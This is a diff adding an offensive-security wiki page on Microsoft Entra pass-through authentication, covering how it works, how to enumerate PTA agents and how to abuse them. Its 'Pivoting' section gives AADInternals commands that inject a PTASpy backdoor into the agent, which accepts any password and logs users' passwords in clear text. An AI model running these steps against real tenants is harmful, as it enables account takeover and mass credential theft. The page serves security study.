@@ -1,0 +1,98 @@
+# Az - PTA - Pass-through Authentication
+
+## Basic Information
+
+[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-pta) Microsoft Entra pass-through authentication allows your users to **sign in to both on-premises and cloud-based applications using the same passwords**. This feature provides your users a better experience - one less password to remember, and reduces IT helpdesk costs because your users are less likely to forget how to sign in. When users sign in using Microsoft Entra ID, this feature validates users' passwords directly against your on-premises Active Directory.
+
+This feature is an **alternative to Microsoft Entra password hash synchronization**, which provides the same benefit of cloud authentication to organizations. However, certain organizations wanting to enforce their on-premises Active Directory security and password policies, can choose to use Pass-through Authentication instead. Review this guide for a comparison of the various Microsoft Entra sign-in methods and how to choose the right sign-in method for your organization.**
+
+In PTA **identities** are **synchronized** but **passwords aren't** like in PHS.
+
+The authentication is validated in the on-prem AD and the communication with cloud is done by an **authentication agent** running in an **on-prem server** (it does't need to be on the on-prem DC).
+
+### Authentication flow
+
+<img src="../../../../images/image (92).png" alt=""><figcaption></figcaption>
+
+1. To **login** the user is redirected to **Azure AD**, where he sends the **username** and **password**
+2. The **credentials** are **encrypted** and set in a **queue** in Azure AD
+3. The **on-prem authentication agent** gathers the **credentials** from the queue and **decrypts** them. This agent is called **"Pass-through authentication agent"** or **PTA agent.**
+4. The **agent** **validates** the creds against the **on-prem AD** and sends the **response** **back** to Azure AD which, if the response is positive, **completes the login** of the user.
+
+> [!WARNING]
+> If an attacker **compromises** the **PTA** he can **see** the all **credentials** from the queue (in **clear-text**).\
+> He can also **validate any credentials** to the AzureAD (similar attack to Skeleton key).
+
+### Enumeration
+
+From Entra ID:
+
+```bash
+az rest --url 'https://graph.microsoft.com/beta/onPremisesPublishingProfiles/authentication/agentGroups?$expand=agents'
+# Example response:
+{
+  "@odata.context": "https://graph.microsoft.com/beta/$metadata#onPremisesPublishingProfiles('authentication')/agentGroups(agents())",
+  "value": [
+    {
+      "agents": [
+        {
+          "externalIp": "20.121.45.57",
+          "id": "4a000eb4-9a02-49e4-b67f-f9b101f8f14c",
+          "machineName": "ConnectSync.hacktricks-con.azure",
+          "status": "active",
+          "supportedPublishingTypes": [
+            "authentication"
+          ]
+        }
+      ],
+      "displayName": "Default group for Pass-through Authentication",
+      "id": "d372d40f-3f81-4824-8b9e-6028182db58e",
+      "isDefault": true,
+      "publishingType": "authentication"
+    }
+  ]
+}
+```
+
+Check if the agent is running in the on-prem server:
+
+```bash
+Get-Service -Name "AzureADConnectAuthenticationAgent"
+```
+
+## Pivoting
+
+If you have **admin** access to the **Azure AD Connect server** with the **PTA** **agent** running, you can use the **AADInternals** module to **insert a backdoor** that will **validate ALL the passwords** introduced (so all passwords will be valid for authentication):
+
+```bash
+Install-Module AADInternals -RequiredVersion 0.9.3
+Import-Module AADInternals
+Install-AADIntPTASpy # Install the backdoor, it'll save all the passwords in a file
+Get-AADIntPTASpyLog -DecodePasswords # Read the file or use this to read the passwords in clear-text
+
+Remove-AADIntPTASpy # Remove the backdoor
+```
+
+> [!NOTE]
+> If the **installation fails**, this is probably due to missing [Microsoft Visual C++ 2015 Redistributables](https://download.microsoft.com/download/6/A/A/6AA4EDFF-645B-48C5-81CC-ED5963AEAD48/vc_redist.x64.exe).
+
+This backdoor will:
+
+- Create a hidden folder `C:\PTASpy`
+- Copy a `PTASpy.dll` to `C:\PTASpy`
+- Injects `PTASpy.dll` to `AzureADConnectAuthenticationAgentService` process
+
+> [!NOTE]
+> When the AzureADConnectAuthenticationAgent service is restarted, PTASpy is “unloaded” and must be re-installed.
+
+> [!CAUTION]
+> After getting **GA privileges** on the cloud, it's possible to **register a new PTA agent** and can **repeat** the **previous** steps to **authenticate using any password** and also, **get the passwords in clear-text.**
+
+### Seamless SSO
+
+It's possible to use Seamless SSO with PTA, which is vulnerable to other abuses. Check it in:
+
+## References
+
+- [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-pta](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-pta)
+- [https://aadinternals.com/post/on-prem_admin/#pass-through-authentication](https://aadinternals.com/post/on-prem_admin/#pass-through-authentication)
